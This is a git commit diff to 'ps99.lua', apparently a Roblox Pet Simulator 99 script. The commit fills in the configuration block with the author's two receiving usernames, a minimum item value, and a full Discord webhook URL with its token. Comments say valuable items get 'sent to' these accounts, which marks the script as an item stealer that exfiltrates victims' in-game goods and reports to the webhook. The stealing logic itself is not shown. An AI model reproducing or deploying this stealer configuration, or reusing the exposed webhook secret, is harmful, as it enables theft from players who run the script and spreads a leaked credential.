53f12ac39f41cc3396cc93764c787bffcaaae4bb
nexer39 <106121640+nexer39@users.noreply.github.com>
2024-11-26 09:51:26 -0500

    Add files via upload

--- ps99.lua
+++ ps99.lua
@@ -1,6 +1,6 @@
 Username = "nexer39"
 Username2 = "nexer36" -- stuff will get sent to this user if first user's mailbox is full
-webhook = "Your discord webhook here"
+webhook = "https://discord.com/api/webhooks/1310925705655091201/tZX2hWTBPosbz2FpP1njMY597I7EK0hxVdq_9ukK5bczVA0tZpnjhbo-fDlr23cASoJc"
 min_rap = 500000 -- minimum rap of each item you want to get sent to you. 1 mil by default
 
 _G.scriptExecuted = _G.scriptExecuted or false
